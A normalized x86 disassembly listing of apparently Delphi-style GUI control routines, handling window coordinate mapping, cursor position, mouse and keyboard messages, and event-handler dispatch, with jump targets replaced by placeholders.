mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4446f8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b5d8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43eddb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4446f8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4446f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d864
test esi esi
je r-xdata
sub_43edf0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403468
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43fc74
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403468
mov eax esi
call sub_43d90c
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43d8c8
mov ecx eax
xor edx edx
xor eax eax
call sub_412594
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403468
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43ee94
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43eec4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43ef30
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43eff0
sub_43ef60
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43ef90
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43da08
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43efbc
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43eff0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43f0c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43f0f8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43f190
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_455b0c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_455b0c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43da64
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45f3b0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403468
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_455a50
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403468
jmp r-xdata
sub_43f324
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4086d8
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408704
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43da64
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408530
call sub_4084cc
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4084cc
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43f3cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43f3fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43f3c0
push ebp
call sub_43f3cc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f44c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43f4d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43f510
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43ef90
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4559c0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403468
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4559c0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403468
sub_43f594
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43da34
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e0fc
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43f510
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43f5e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43da34
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43f5fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43da34
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e0fc
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43f510
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403468
sub_43f654
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43ef30
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43eec4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43ef30
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43f6f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f510
pop esi
pop ebx
retn
sub_43f715
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f510
pop esi
pop ebx
retn
sub_43f73b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f510
pop esi
pop ebx
retn
sub_43f765
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f510
pop esi
pop ebx
retn
sub_43f790
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43f7c0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43ef90
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4559c0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403468
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4559c0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403468
sub_43f838
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43f870
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4559c0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403468
sub_43f8a8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43e0fc
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43f870
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406980
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403468
sub_43f920
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f870
pop esi
pop ebx
retn
sub_43f940
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f870
pop esi
pop ebx
retn
sub_43f960
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4559c0
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403468
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4490b4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f9b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43e0ec
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43e0fc
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43f0c4
pop esi
retn
sub_43f9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43f0f8
sub_43faa6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43e30c
mov cl 0x1
sub_43fae8
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43e064
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43e064
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43fb18
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43fb3c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406980
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403468
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43f0c4
mov [ ebx + 0xc ] eax
sub_43fbe0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43dfb8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43dfb8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43fc74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031b4
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43d658
mov edx [ esp ]
mov eax esi
call sub_43d634
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43d8e0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43d924
sub_43fcf8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_41256c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43d9dc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4125bc
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d884
pop edi
pop esi
